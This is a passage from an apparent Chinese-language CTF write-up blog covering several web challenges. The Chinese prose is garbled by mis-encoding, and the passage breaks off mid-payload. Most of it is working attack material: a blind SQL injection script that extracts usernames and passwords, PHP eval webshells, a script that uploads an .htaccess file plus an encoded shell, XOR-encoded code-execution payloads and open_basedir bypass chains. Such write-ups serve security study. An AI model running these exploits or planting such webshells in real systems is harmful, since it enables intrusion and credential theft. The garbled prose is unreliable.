class="variable">$id</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure>

<p>å‘ç°sqlè¯­å¥ï¼Œå¯ä»¥ä¼ é€’idå’Œpathä¸¤ä¸ªå‚æ•°ï¼Œè§¦å‘SQLæ³¨å…¥ï¼Œå‰ææ˜¯è¦ç»•è¿‡å¯¹idå’Œpathçš„è¿‡æ»¤ã€‚æ¥ä¸‹æ¥æƒ³åŠæ³•ç»•è¿‡è¿‡æ»¤ï¼Œä¸»è¦æ˜¯ç ´åå•å¼•å·</p>
<p>åªèƒ½æ˜¯ç”¨è½¬ä¹‰å­—ç¬¦<code>\</code>æˆ–è€…å•å¼•å·è‡ªå·±æ¥ç ´åã€‚ä½†æ˜¯ç”¨å•å¼•å·ä¸€å®šä¼šè¢«æ›¿æ¢æ‰ï¼Œåªèƒ½è€ƒè™‘<code>\</code></p>
<p>å¦‚æœå‚æ•°ä¸­æœ‰<code>\</code>æˆ–è€…<code>&#39;</code>ä¼šè¢«åœ¨åŠ ä¸Šä¸€ä¸ª<code>\</code>æ¥è½¬ä¹‰ã€‚å› æ­¤å¦‚æœä»¤idä¸º<code>\0</code>ï¼Œidä¼šå…ˆå˜æˆ<code>\\0</code>ã€‚ä¹‹å<code>\0</code>è¢«æ›¿æ¢æ‰ï¼Œä¼šå‰©ä¸‹ä¸€ä¸ª<code>\</code></p>
<p>è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">url_format,length=<span class="literal">None</span></span>):</span><br><span class="line">    rlt = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    url  = url_format</span><br><span class="line">    <span class="keyword">if</span> length==<span class="literal">None</span>:</span><br><span class="line">        length = <span class="number">30</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">    <span class="comment">#ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span></span><br><span class="line">        begin = <span class="number">32</span></span><br><span class="line">        ends = <span class="number">126</span></span><br><span class="line">        tmp = (begin+ends)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> begin&lt;ends:</span><br><span class="line">            r = requests.get(url.<span class="built_in">format</span>(l,tmp))</span><br><span class="line">            <span class="keyword">if</span> r.content!=<span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">                begin = tmp+<span class="number">1</span></span><br><span class="line">                tmp = (begin+ends)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ends = tmp</span><br><span class="line">                tmp = (begin+ends)//<span class="number">2</span></span><br><span class="line">        <span class="comment">#é…Œæƒ…åˆ é™¤ï¼Œæ¯•ç«Ÿä¸€èˆ¬åº“è¡¨åˆ—é‡Œéƒ½æ²¡æœ‰ç©ºæ ¼</span></span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        rlt+=<span class="built_in">chr</span>(tmp)</span><br><span class="line">        <span class="built_in">print</span>(rlt)</span><br><span class="line">    <span class="keyword">return</span> rlt.rstrip()</span><br><span class="line">url =<span class="string">&#x27;http://87942c48-9ef1-4f40-97af-3058097ac1dd.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20ord(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;%23&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;æ•°æ®åº“åä¸ºï¼š&#x27;</span>,exp(url))</span><br><span class="line">url =<span class="string">&#x27;http://87942c48-9ef1-4f40-97af-3058097ac1dd.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20ord(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=0x636973636e66696e616c),&#123;&#125;,1))&gt;&#123;&#125;%23&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;è¡¨åä¸ºï¼š&#x27;</span>,exp(url))</span><br><span class="line">url =<span class="string">&#x27;http://87942c48-9ef1-4f40-97af-3058097ac1dd.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20ord(substr((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=0x636973636e66696e616c and table_name=0x7573657273),&#123;&#125;,1))&gt;&#123;&#125;%23&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;åˆ—åä¸ºï¼š&#x27;</span>,exp(url))</span><br><span class="line">url =<span class="string">&#x27;http://87942c48-9ef1-4f40-97af-3058097ac1dd.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20ord(substr((select%20group_concat(username)%20from%20users),&#123;&#125;,1))&gt;&#123;&#125;%23&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ç”¨æˆ·åä¸ºï¼š&#x27;</span>,exp(url))</span><br><span class="line">url =<span class="string">&#x27;http://87942c48-9ef1-4f40-97af-3058097ac1dd.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20ord(substr((select%20group_concat(password)%20from%20users),&#123;&#125;,1))&gt;&#123;&#125;%23&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;å¯†ç ä¸ºï¼š&#x27;</span>,exp(url))</span><br><span class="line"><span class="comment">#urlè¦å¡«å…¥è‡ªå·±çš„</span></span><br></pre></td></tr></table></figure>

<p>è·‘å®Œåæœ‰è´¦å·å¯†ç ï¼Œç™»å½•åæœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ </p>
<p>ä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åå†™å…¥logæ–‡ä»¶ï¼Œæƒ³åˆ°å¯ä»¥å†™æœ¨é©¬è¿›å»ï¼Œä½†æ˜¯phpè¢«è¿‡æ»¤ï¼Œç”¨&#x3D;ä»£æ›¿</p>
<p><code>&lt;?= @eval($_POST[&#39;cmd&#39;]);?&gt;</code>		è¦åœ¨æŠ“åŒ…çš„æ—¶å€™æ”¹åå­—</p>
<p>ç„¶åè®¿é—®æ–‡ä»¶ï¼Œè¿æ¥èšå‰‘ã€‚</p>
<hr>
<h4 id="çº¢æ˜è°·CTF-2021-write-shell"><a href="#çº¢æ˜è°·CTF-2021-write-shell" class="headerlink" title="[çº¢æ˜è°·CTF 2021]write_shell"></a>[çº¢æ˜è°·CTF 2021]write_shell</h4><p>è¿™é¢˜ä¸»è¦æœ‰ä¸¤ä¸ªçŸ¥è¯†ç‚¹<br>1.phpçŸ­æ ‡ç­¾<br>2.phpå¯åœ¨&#96;&#96;ä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p>
<p><code>&lt;?= ?&gt;</code>ç›¸å½“äº<code>&lt;?echo ?&gt;</code>,ç©ºæ ¼æ¯è¿‡æ»¤äº†ç”¨%09ä»£æ›¿</p>
<p>PHP æ”¯æŒä¸€ä¸ªæ‰§è¡Œè¿ç®—ç¬¦ï¼šåå¼•å·ï¼ˆ``ï¼‰ã€‚æ³¨æ„è¿™ä¸æ˜¯å•å¼•å·ï¼PHP å°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›ï¼ˆå³ï¼Œå¯ä»¥èµ‹ç»™ä¸€ä¸ªå˜é‡è€Œä¸æ˜¯ç®€å•åœ°ä¸¢å¼ƒåˆ°æ ‡å‡†è¾“å‡ºï¼‰ã€‚ä½¿ç”¨åå¼•å·è¿ç®—ç¬¦â€&#96;â€çš„æ•ˆæœä¸å‡½æ•°shell_exec() ç›¸åŒã€‚</p>
<p>paylaod:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=&lt;?echo%09`cat%09/flllllll1112222222lag`?&gt;&amp;action=upload</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h4><p>ç›´æ¥ç»™äº†æºä»£ç ï¼Œæœ‰ä¸€ä¸ª<code>get_the_flag</code>å‡½æ•°å’Œgetä¼ å‚<code>_</code> ï¼Œæœ€åä¼šæ‰§è¡Œ<code>eval(_)</code></p>
<p>æ€è·¯ï¼šgetä¼ å‚åˆ©ç”¨get_the_flagå‡½æ•°ä¸Šä¼ æœ¨é©¬æ–‡ä»¶</p>
<p>&#x3D;&#x3D;æ— æ•°å­—å­—æ¯getshell&#x3D;&#x3D;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br></pre></td></tr></table></figure>

<p>å¿…é¡»è¦ç»•è¿‡è¿™ä¸ªæ­£åˆ™åŒ¹é…</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;.htaccessæ–‡ä»¶ä¸Šä¼ &#x3D;&#x3D;</p>
<p>åˆ©ç”¨pythonè„šæœ¬ä¸Šä¼ æ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://b2e4412f-0209-4b01-b734-0d94367d7f84.node4.buuoj.cn:81/?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag&#x27;</span></span><br><span class="line">htaccess=<span class="string">&#x27;&#x27;&#x27;#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .ha</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_cc551ab005b2e60fbdc88de809b2c4b1/shell.ha&quot;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;file&#x27;</span> : (<span class="string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="string">&#x27;image/jpeg&#x27;</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,files=files)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">shell = <span class="string">b&quot;GIF89a12&quot;</span> + base64.b64encode(<span class="string">b&quot;&lt;?php eval($_POST[&#x27;shell&#x27;]);?&gt;&quot;</span>)  <span class="comment">#GIF89a12é‡Œçš„12æ˜¯ä¸ºäº†ç¬¦åˆbase64è§£ç è§„èŒƒè€Œæ·»åŠ çš„</span></span><br><span class="line"></span><br><span class="line">files2 = &#123;</span><br><span class="line">  <span class="string">&#x27;file&#x27;</span> : (<span class="string">&#x27;shell.ha&#x27;</span>,shell,<span class="string">&#x27;image/jpeg&#x27;</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,files=files2)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°è·¯å¾„<code>upload/tmp_cc551ab005b2e60fbdc88de809b2c4b1/shell.ha</code></p>
<p>è®¿é—®ç„¶åèšå‰‘è¿æ¥</p>
<p>&#x3D;&#x3D;open_basedirç»•è¿‡&#x3D;&#x3D;</p>
<blockquote>
<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨èšå‰‘è‡ªå¸¦çš„æ’ä»¶ç›´æ¥æ‹¿flag(éé¢„æœŸ)</p>
</blockquote>
<p>ç»•è¿‡æ–¹æ³•å¤§è‡´å¦‚ä¸‹ï¼ˆphp5æœ‰å…¶å®ƒæ–¹æ³•ï¼‰ï¼š</p>
<ul>
<li><p>é¦–å…ˆæ„é€ ä¸€ä¸ªç›¸å¯¹å¯ä»¥ä¸Šè·³çš„open_basedir å…¥<code>mkdir(&#39;mayi&#39;); chdir(&#39;mayi&#39;)</code> å½“ç„¶æˆ‘ä»¬è¿™é‡Œæœ‰ä¸Šè·³çš„è·¯å¾„æˆ‘ä»¬ç›´æ¥ <code>chdir(&quot;img&quot;)</code></p>
</li>
<li><p>ç„¶åæ¯æ¬¡æ“ä½œ<code>chdir(&quot;..&quot;)</code>éƒ½ä¼šè¿›ä¸€æ¬¡open_basedirçš„æ¯”å¯¹ç”±äºç›¸å¯¹è·¯å¾„çš„é—®é¢˜ï¼Œæ¯æ¬¡open_basedirçš„è¡¥å…¨éƒ½ä¼šä¸Šè·³ã€‚</p>
</li>
<li><p>æ¯”å¦‚åˆè¯•open_basedirä¸º&#x2F;a&#x2F;b&#x2F;c&#x2F;dï¼š</p>
</li>
<li><p>ç¬¬ä¸€æ¬¡chdiråå˜ä¸º&#x2F;a&#x2F;b&#x2F;cï¼Œç¬¬äºŒæ¬¡chdiråå˜ä¸º&#x2F;a&#x2F;bï¼Œç¬¬ä¸‰æ¬¡chdiråå˜ä¸º&#x2F;aã€€ç¬¬å››æ¬¡chdiråå˜ä¸º&#x2F;</p>
</li>
<li><p>é‚£ä¹ˆè¿™æ—¶å€™å†è¿›è¡Œini_setï¼Œè°ƒæ•´open_basedirä¸º&#x2F;å³å¯é€šè¿‡php_check_open_basedir_exçš„æ ¡éªŒï¼ŒæˆåŠŸè¦†ç›–ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥bypass open_basedirã€‚</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1:shell=chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);print_r(scandir(&#x27;/&#x27;));</span><br><span class="line"></span><br><span class="line">payload2:shell=chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);print(readfile(&#x27;/THis_Is_tHe_F14g&#x27;));</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h4><p>&#x3D;&#x3D;æ— æ•°å­—å­—æ¯rce&#x3D;&#x3D;</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±æ˜¾ç¤ºäº†phpinfo</p>
<p>å°è¯•äº†system()å‡½æ•°ï¼Œæ— æœã€‚åº”è¯¥æ˜¯æœ‰é™åˆ¶çš„ã€‚</p>
<p>å¯ä»¥åˆ©ç”¨<code>assert(eval($_POST[cmd]))</code>å†™ğŸ</p>
<p>ç›´æ¥å–å</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6);&amp;%ff=assert</span><br></pre></td></tr></table></figure>

<p>postä¼ å‚<code>cmd=phpinfo();</code>æˆåŠŸäº†</p>
<p>èšå‰‘è¿æ¥ï¼Œä½†æ˜¯æ— æ³•è¯»å–æ–‡ä»¶ï¼Œç›´æ¥ä½¿ç”¨èšå‰‘çš„disable_functionæ’ä»¶ç»•è¿‡<code>open_basedir</code>é™åˆ¶ã€‚</p>
<p>åœ¨å‘½ä»¤è¡Œæ‰§è¡Œ<code>/readflag</code> æ‹¿åˆ°flag</p>
<hr>
<h4 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h4><p>æç¤ºå‘é€jsonæ•°æ®</p>
<p><code>&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</code></p>
<p>å›æ˜¾index.php</p>
<ol>
<li>ä»£ç ä¸­ä½¿ç”¨<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code> é…ç½®ç³»ç»Ÿç¯å¢ƒå˜é‡ï¼Œè€Œæˆ‘ä»¬ç”¨ä¸äº† cat ä¹Ÿæœ‰å¯èƒ½æ˜¯åœ¨è¿™ä¸ªç¯å¢ƒå˜é‡ä¸‹æ²¡æœ‰è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€‚æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨<code>/bin/cat</code> æ¥è°ƒç”¨catå‘½ä»¤ã€‚</li>
<li>Linuxå‘½ä»¤çš„ä½ç½®ï¼š&#x2F;bin,&#x2F;usr&#x2F;binï¼Œé»˜è®¤éƒ½æ˜¯å…¨ä½“ç”¨æˆ·ä½¿ç”¨ï¼Œ&#x2F;sbin,&#x2F;usr&#x2F;sbin,é»˜è®¤rootç”¨æˆ·ä½¿ç”¨</li>
</ol>
<p>&#x3D;&#x3D;%0aç»•è¿‡æ­£åˆ™&#x3D;&#x3D;</p>
<p>payload:</p>
<p>&#96;?cmd&#x3D;</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/CTF/" rel="tag"># CTF</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/12/25/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" rel="prev" title="ä¿¡æ¯æœé›†">
      <i class="fa fa-chevron-left"></i> ä¿¡æ¯æœé›†
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/04/23/Weblogic%20SSRF%E6%BC%8F%E6%B4%9E/" rel="next" title="Weblogic SSRFæ¼æ´">
      Weblogic SSRFæ¼æ´ <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">å‘½ä»¤æ³¨å…¥</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec1"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">[ACTF2020 æ–°ç”Ÿèµ›]Exec1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">2.</span> <span class="nav-text">ä»£ç å®¡è®¡</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#HCTF-2018-WarmUp"><span class="nav-number">2.0.0.1.</span> <span class="nav-text">[HCTF 2018]WarmUp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile"><span class="nav-number">2.0.0.2.</span> <span class="nav-text">[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">3.</span> <span class="nav-text">æ–‡ä»¶ä¸Šä¼ </span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="nav-number">3.0.0.1.</span> <span class="nav-text">[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload"><span class="nav-number">3.0.0.2.</span> <span class="nav-text">[ACTF2020 æ–°ç”Ÿèµ›]Upload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2"><span class="nav-number">3.0.0.3.</span> <span class="nav-text">[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GXYCTF2019-BabyUpload"><span class="nav-number">3.0.0.4.</span> <span class="nav-text">[GXYCTF2019]BabyUpload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SUCTF-2019-CheckIn"><span class="nav-number">3.0.0.5.</span> <span class="nav-text">[SUCTF 2019]CheckIn</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.</span> <span class="nav-text">PHPå­—ç¬¦ä¸²è§£ææ¼æ´</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#RoarCTF-2019-Easy-Calc"><span class="nav-number">4.0.0.1.</span> <span class="nav-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag"><span class="nav-number">4.0.0.2.</span> <span class="nav-text">[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Zer0pts2020-Can-you-guess-it"><span class="nav-number">4.0.0.3.</span> <span class="nav-text">[Zer0pts2020]Can you guess it?</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">5.</span> <span class="nav-text">phpååºåˆ—åŒ–</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="nav-number">5.0.0.1.</span> <span class="nav-text">[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz"><span class="nav-number">5.0.0.2.</span> <span class="nav-text">[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NPUCTF2020-ReadlezPHP"><span class="nav-number">5.0.0.3.</span> <span class="nav-text">[NPUCTF2020]ReadlezPHP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php"><span class="nav-number">5.0.0.4.</span> <span class="nav-text">[å®‰æ´µæ¯ 2019]easy_serialize_php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0CTF-2016-piapiapia"><span class="nav-number">5.0.0.5.</span> <span class="nav-text">[0CTF 2016]piapiapia</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox"><span class="nav-number">5.0.0.6.</span> <span class="nav-text">[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SWPUCTF-2018-SimplePHP"><span class="nav-number">5.0.0.7.</span> <span class="nav-text">[SWPUCTF 2018]SimplePHP</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">6.</span> <span class="nav-text">SQLæ³¨å…¥</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a 